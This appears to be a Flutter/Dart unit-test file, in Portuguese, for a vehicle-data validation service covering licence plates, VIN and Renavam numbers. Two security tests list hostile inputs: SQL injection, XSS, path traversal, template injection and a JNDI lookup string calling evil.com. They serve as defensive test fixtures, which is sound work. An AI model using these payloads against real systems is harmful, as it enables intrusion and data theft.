import 'package:flutter_test/flutter_test.dart';
import 'package:maga_app/src/services/vehicle_data_extraction_service.dart';

void main() {
  group('VehicleDataExtractionService Tests', () {
    
    // Guard Rails: Testes de validação de entrada
    group('Guard Rails - Validação de Entrada', () {
      test('deve tratar valores null com segurança', () {
        expect(() => VehicleDataExtractionService.identifyPlateModel(null as dynamic), 
               throwsA(isA<TypeError>()));
        expect(() => VehicleDataExtractionService.isValidChassi(null as dynamic), 
               throwsA(isA<TypeError>()));
        expect(() => VehicleDataExtractionService.isValidRenavam(null as dynamic), 
               throwsA(isA<TypeError>()));
      });

      test('deve tratar strings extremamente longas', () {
        final longString = 'A' * 10000; // String com 10k caracteres
        expect(VehicleDataExtractionService.identifyPlateModel(longString), equals('nao_identificado'));
        expect(VehicleDataExtractionService.isValidChassi(longString), isFalse);
        expect(VehicleDataExtractionService.isValidRenavam(longString), isFalse);
      });

      test('deve tratar caracteres especiais e unicode', () {
        const specialChars = ['🚗', '♠️', 'ñ', 'ç', '€', '¥', '©', '®'];
        for (final char in specialChars) {
          expect(VehicleDataExtractionService.identifyPlateModel(char), equals('nao_identificado'));
          expect(VehicleDataExtractionService.isValidChassi(char), isFalse);
          expect(VehicleDataExtractionService.isValidRenavam(char), isFalse);
        }
      });

      test('deve tratar entradas com apenas espaços', () {
        const whitespaceInputs = ['   ', '\t\t\t', '\n\n\n', '   \t\n   '];
        for (final input in whitespaceInputs) {
          expect(VehicleDataExtractionService.identifyPlateModel(input), equals('nao_identificado'));
          expect(VehicleDataExtractionService.isValidChassi(input), isFalse);
          expect(VehicleDataExtractionService.isValidRenavam(input), isFalse);
        }
      });

      test('deve validar dados maliciosos (SQL injection patterns)', () {
        const maliciousInputs = [
          "'; DROP TABLE--",
          "1' OR '1'='1",
          "<script>alert('xss')</script>",
          "../../../etc/passwd",
          "{{7*7}}",
          "\${jndi:ldap://evil.com/a}"
        ];
        
        for (final input in maliciousInputs) {
          expect(VehicleDataExtractionService.identifyPlateModel(input), equals('nao_identificado'));
          expect(VehicleDataExtractionService.isValidChassi(input), isFalse);
          expect(VehicleDataExtractionService.isValidRenavam(input), isFalse);
        }
      });
    });

    test('deve identificar placa modelo antigo corretamente', () {
      // Testa vários formatos de placa antiga
      expect(VehicleDataExtractionService.identifyPlateModel('ABC-1234'), equals('antigo'));
      expect(VehicleDataExtractionService.identifyPlateModel('ABC1234'), equals('antigo'));
      expect(VehicleDataExtractionService.identifyPlateModel('abc-1234'), equals('antigo'));
      expect(VehicleDataExtractionService.identifyPlateModel('XYZ-9999'), equals('antigo'));
    });

    test('deve identificar placa modelo Mercosul corretamente', () {
      // Testa formato Mercosul
      expect(VehicleDataExtractionService.identifyPlateModel('ABC1D23'), equals('mercosul'));
      expect(VehicleDataExtractionService.identifyPlateModel('XYZ9A88'), equals('mercosul'));
      expect(VehicleDataExtractionService.identifyPlateModel('abc1d23'), equals('mercosul'));
    });    test('deve identificar placa inválida', () {
      // Testa formatos inválidos
      expect(VehicleDataExtractionService.identifyPlateModel('ABC123'), equals('nao_identificado'));
      expect(VehicleDataExtractionService.identifyPlateModel('ABCD-1234'), equals('nao_identificado'));
      expect(VehicleDataExtractionService.identifyPlateModel('123-ABCD'), equals('nao_identificado'));
      expect(VehicleDataExtractionService.identifyPlateModel(''), equals('nao_identificado'));
    });

    // Guard Rails: Testes de robustez para chassi
    group('Guard Rails - Validação de Chassi', () {
      test('deve rejeitar chassi com caracteres proibidos em qualquer posição', () {
        // Testa I, O, Q em diferentes posições
        const forbiddenChars = ['I', 'O', 'Q'];
        for (final char in forbiddenChars) {
          for (int i = 0; i < 17; i++) {
            final chassi = '9BWSU19F08B302158'.replaceRange(i, i + 1, char);
            expect(VehicleDataExtractionService.isValidChassi(chassi), isFalse,
                   reason: 'Chassi com $char na posição $i deveria ser inválido');
          }
        }
      });

      test('deve validar chassi com case insensitive', () {
        expect(VehicleDataExtractionService.isValidChassi('9bwsu19f08b302158'), isTrue);
        expect(VehicleDataExtractionService.isValidChassi('9BWSU19F08B302158'), isTrue);
        expect(VehicleDataExtractionService.isValidChassi('9BwSu19F08b302158'), isTrue);
      });      test('deve rejeitar chassi com caracteres não alfanuméricos', () {
        final invalidChars = ['-', '_', ' ', '.', '/', '\\', '@', '#', '\$', '%'];
        for (final char in invalidChars) {
          final chassi = '9BWSU19F08B30215$char';
          expect(VehicleDataExtractionService.isValidChassi(chassi), isFalse,
                 reason: 'Chassi com caractere especial $char deveria ser inválido');
        }
      });

      test('deve rejeitar chassi com tamanhos extremos', () {
        // Muito curto
        for (int i = 0; i < 17; i++) {
          final shortChassi = '9BWSU19F08B302158'.substring(0, i);
          expect(VehicleDataExtractionService.isValidChassi(shortChassi), isFalse);
        }
        
        // Muito longo
        for (int i = 18; i <= 25; i++) {
          final longChassi = '9BWSU19F08B302158' + 'A' * (i - 17);
          expect(VehicleDataExtractionService.isValidChassi(longChassi), isFalse);
        }
      });
    });

    // Guard Rails: Testes de robustez para Renavam
    group('Guard Rails - Validação de Renavam', () {      test('deve rejeitar Renavam com caracteres não numéricos', () {
        final invalidChars = ['A', 'Z', '-', '_', ' ', '.', '/', '\\', '@'];
        for (final char in invalidChars) {
          final renavam = '1234567890$char';
          expect(VehicleDataExtractionService.isValidRenavam(renavam), isFalse,
                 reason: 'Renavam com caractere $char deveria ser inválido');
        }
      });

      test('deve rejeitar Renavam com tamanhos extremos', () {
        // Muito curto
        for (int i = 0; i < 11; i++) {
          final shortRenavam = '12345678901'.substring(0, i);
          expect(VehicleDataExtractionService.isValidRenavam(shortRenavam), isFalse);
        }
        
        // Muito longo
        for (int i = 12; i <= 20; i++) {
          final longRenavam = '12345678901' + '0' * (i - 11);
          expect(VehicleDataExtractionService.isValidRenavam(longRenavam), isFalse);
        }
      });

      test('deve validar Renavam com zeros à esquerda', () {
        expect(VehicleDataExtractionService.isValidRenavam('00000000001'), isTrue);
        expect(VehicleDataExtractionService.isValidRenavam('00012345678'), isTrue);
        expect(VehicleDataExtractionService.isValidRenavam('00000000000'), isTrue);
      });
    });

    test('deve validar chassi corretamente', () {
      // Chassi válido (17 caracteres, sem I, O, Q)
      expect(VehicleDataExtractionService.isValidChassi('9BWSU19F08B302158'), isTrue);
      expect(VehicleDataExtractionService.isValidChassi('1HGBH41JXMN109186'), isTrue);
      
      // Chassi inválido
      expect(VehicleDataExtractionService.isValidChassi(''), isFalse);
      expect(VehicleDataExtractionService.isValidChassi('123456789'), isFalse); // Muito curto
      expect(VehicleDataExtractionService.isValidChassi('12345678901234567890'), isFalse); // Muito longo
      expect(VehicleDataExtractionService.isValidChassi('9BWSU19F08B30215I'), isFalse); // Contém I
      expect(VehicleDataExtractionService.isValidChassi('9BWSU19F08B30215O'), isFalse); // Contém O
      expect(VehicleDataExtractionService.isValidChassi('9BWSU19F08B30215Q'), isFalse); // Contém Q
    });

    test('deve validar Renavam corretamente', () {
      // Renavam válido (11 dígitos)
      expect(VehicleDataExtractionService.isValidRenavam('12345678901'), isTrue);
      expect(VehicleDataExtractionService.isValidRenavam('00000000001'), isTrue);
      
      // Renavam inválido
      expect(VehicleDataExtractionService.isValidRenavam(''), isFalse);
      expect(VehicleDataExtractionService.isValidRenavam('123456789'), isFalse); // Muito curto
      expect(VehicleDataExtractionService.isValidRenavam('123456789012'), isFalse); // Muito longo
      expect(VehicleDataExtractionService.isValidRenavam('1234567890A'), isFalse); // Contém letra
    });    test('deve gerar orientação para placa antiga', () {
      final orientacao = VehicleDataExtractionService.generatePlateGuidance('antigo', true);
      
      expect(orientacao, contains('PLACA MODELO ANTIGO'));
      expect(orientacao, contains('NÃO é necessário'));
      expect(orientacao, contains('continua válida'));
    });

    test('deve gerar orientação para placa Mercosul', () {
      final orientacao = VehicleDataExtractionService.generatePlateGuidance('mercosul', true);
      
      expect(orientacao, contains('PLACA MODELO MERCOSUL'));
      expect(orientacao, contains('já está no padrão Mercosul'));
      expect(orientacao, contains('Fazer Pedido'));
    });

    test('deve gerar orientação para veículo sem placa', () {
      final orientacao = VehicleDataExtractionService.generatePlateGuidance('nao_identificado', false);
      
      expect(orientacao, contains('SEM PLACA'));
      expect(orientacao, contains('Emplacamento obrigatório'));
      expect(orientacao, contains('Fazer Pedido'));
    });

    // Guard Rails: Testes de robustez para orientações
    group('Guard Rails - Geração de Orientações', () {
      test('deve tratar modelos de placa inválidos com segurança', () {
        final invalidModels = ['', 'invalido', 'ANTIGO', 'MERCOSUL', null, '123', 'placa_nova'];
        
        for (final model in invalidModels) {
          expect(() => VehicleDataExtractionService.generatePlateGuidance(model as String, true),
                 returnsNormally, reason: 'Método deveria tratar modelo inválido: $model');
        }
      });

      test('deve gerar orientação consistente independente do caso', () {
        final orientacao1 = VehicleDataExtractionService.generatePlateGuidance('antigo', true);
        final orientacao2 = VehicleDataExtractionService.generatePlateGuidance('ANTIGO', true);
        
        // Deve ser consistente (assumindo que o método normaliza case)
        expect(orientacao1, isNotEmpty);
        expect(orientacao2, isNotEmpty);
      });

      test('deve tratar combinações extremas de parâmetros', () {
        final combinations = [
          ('', true),
          ('', false),
          ('antigo', true),
          ('antigo', false),
          ('mercosul', true),
          ('mercosul', false),
          ('nao_identificado', true),
          ('nao_identificado', false),
        ];

        for (final (model, hasPlate) in combinations) {
          final result = VehicleDataExtractionService.generatePlateGuidance(model, hasPlate);
          expect(result, isNotEmpty, reason: 'Orientação não deveria estar vazia para: $model, $hasPlate');
          expect(result.length, greaterThan(10), reason: 'Orientação muito curta para: $model, $hasPlate');
        }
      });
    });

    // Guard Rails: Testes de robustez para formatação de resultados
    group('Guard Rails - Formatação de Resultados', () {
      test('deve tratar Map vazio com segurança', () {
        final result = VehicleDataExtractionService.formatExtractionResult({});
        expect(result, isNotEmpty);
        expect(result, contains('erro'));
      });

      test('deve tratar Map com dados corrompidos', () {
        final corruptedData = {
          'success': 'not_boolean',
          'chassi': 123,
          'placa': ['not', 'string'],
          'renavam': {'invalid': 'type'},
          'modelo_placa': null,
        };

        expect(() => VehicleDataExtractionService.formatExtractionResult(corruptedData),
               returnsNormally, reason: 'Método deveria tratar dados corrompidos com segurança');
      });

      test('deve tratar Map com chaves faltantes', () {
        final incompleteData = {
          'success': true,
          // Faltam todas as outras chaves
        };

        final result = VehicleDataExtractionService.formatExtractionResult(incompleteData);
        expect(result, isNotEmpty);
        expect(result, isNot(contains('null')), reason: 'Resultado não deveria mostrar valores null');
      });

      test('deve validar integridade dos dados de saída', () {
        final validData = {
          'success': true,
          'chassi': '9BWSU19F08B302158',
          'placa': 'ABC-1234',
          'renavam': '12345678901',
          'modelo_placa': 'antigo',
          'chassi_valido': true,
          'renavam_valido': true,
          'dados_completos': true,
          'orientacao': 'Placa modelo antigo válida'
        };

        final result = VehicleDataExtractionService.formatExtractionResult(validData);
        
        // Verifica se não há vazamentos de dados sensíveis
        expect(result, isNot(contains('password')));
        expect(result, isNot(contains('token')));
        expect(result, isNot(contains('secret')));
        expect(result, isNot(contains('key')));
        
        // Verifica formatação adequada
        expect(result, matches(RegExp(r'^[^<>]*$')), reason: 'Resultado não deveria conter HTML/XML');
        expect(result.length, lessThan(5000), reason: 'Resultado muito longo, possível problema');
      });
    });

    test('deve formatar resultado de extração com sucesso', () {
      final extractionData = {
        'success': true,
        'chassi': '9BWSU19F08B302158',
        'placa': 'ABC-1234',
        'renavam': '12345678901',
        'modelo_placa': 'antigo',
        'chassi_valido': true,
        'renavam_valido': true,
        'dados_completos': true,
        'orientacao': 'Placa modelo antigo válida'
      };

      final result = VehicleDataExtractionService.formatExtractionResult(extractionData);

      expect(result, contains('ANÁLISE DE DADOS VEICULARES'));
      expect(result, contains('CHASSI: 9BWSU19F08B302158 ✅'));
      expect(result, contains('PLACA: ABC-1234 (Modelo Antigo) ✅'));
      expect(result, contains('RENAVAM: 12345678901 ✅'));
      expect(result, contains('DOCUMENTAÇÃO COMPLETA'));
    });

    test('deve formatar resultado de extração com erro', () {
      final extractionData = {
        'success': false,
        'error': 'Erro na análise'
      };

      final result = VehicleDataExtractionService.formatExtractionResult(extractionData);

      expect(result, contains('Erro na análise do documento'));
      expect(result, contains('Erro na análise'));
      expect(result, contains('melhor qualidade'));
    });    test('deve formatar resultado com dados incompletos', () {
      final extractionData = {
        'success': true,
        'chassi': '9BWSU19F08B302158',
        'placa': null,
        'renavam': null,
        'chassi_valido': true,
        'dados_completos': false,
        'orientacao': 'Dados incompletos'
      };

      final result = VehicleDataExtractionService.formatExtractionResult(extractionData);

      expect(result, contains('CHASSI: 9BWSU19F08B302158 ✅'));
      expect(result, contains('PLACA: Não identificada ❌'));
      expect(result, contains('RENAVAM: Não identificado ❌'));
      expect(result, contains('DOCUMENTAÇÃO INCOMPLETA'));
    });

    // Guard Rails: Testes de performance e limites
    group('Guard Rails - Performance e Limites', () {
      test('deve processar grandes volumes de validações rapidamente', () {
        final stopwatch = Stopwatch()..start();
        
        // Executa 1000 validações
        for (int i = 0; i < 1000; i++) {
          VehicleDataExtractionService.identifyPlateModel('ABC-1234');
          VehicleDataExtractionService.isValidChassi('9BWSU19F08B302158');
          VehicleDataExtractionService.isValidRenavam('12345678901');
        }
        
        stopwatch.stop();
        expect(stopwatch.elapsedMilliseconds, lessThan(1000), 
               reason: 'Validações deveriam ser executadas em menos de 1 segundo');
      });

      test('deve ter uso de memória controlado', () {
        // Testa se não há vazamento de memória com strings grandes
        for (int i = 0; i < 100; i++) {
          final largeString = 'A' * (i * 100);
          VehicleDataExtractionService.identifyPlateModel(largeString);
        }
        
        // Se chegou até aqui sem OutOfMemoryError, passou no teste
        expect(true, isTrue);
      });
    });

    // Guard Rails: Testes de segurança
    group('Guard Rails - Segurança', () {
      test('deve impedir ataques de regex DoS', () {
        // Padrões que podem causar catastrophic backtracking
        final maliciousPatterns = [
          'A' * 10000 + '!',
          'ABC-' + '1' * 10000,
          ('(' * 1000) + 'ABC-1234' + (')' * 1000),
        ];

        for (final pattern in maliciousPatterns) {
          final stopwatch = Stopwatch()..start();
          VehicleDataExtractionService.identifyPlateModel(pattern);
          stopwatch.stop();
          
          expect(stopwatch.elapsedMilliseconds, lessThan(100),
                 reason: 'Regex não deveria demorar mais que 100ms para: ${pattern.substring(0, 50)}...');
        }
      });

      test('deve sanitizar saídas de formatação', () {
        final maliciousData = {
          'success': true,
          'chassi': '<script>alert("xss")</script>',
          'placa': '${"\${jndi:ldap://evil.com}"}',
          'renavam': "'; DROP TABLE users; --",
          'orientacao': '<img src=x onerror=alert(1)>',
        };

        final result = VehicleDataExtractionService.formatExtractionResult(maliciousData);
        
        // Verifica se não há conteúdo malicioso na saída
        expect(result, isNot(contains('<script>')));
        expect(result, isNot(contains('javascript:')));
        expect(result, isNot(contains('jndi:')));
        expect(result, isNot(contains('DROP TABLE')));
        expect(result, isNot(contains('onerror=')));
      });
    });
  });
}
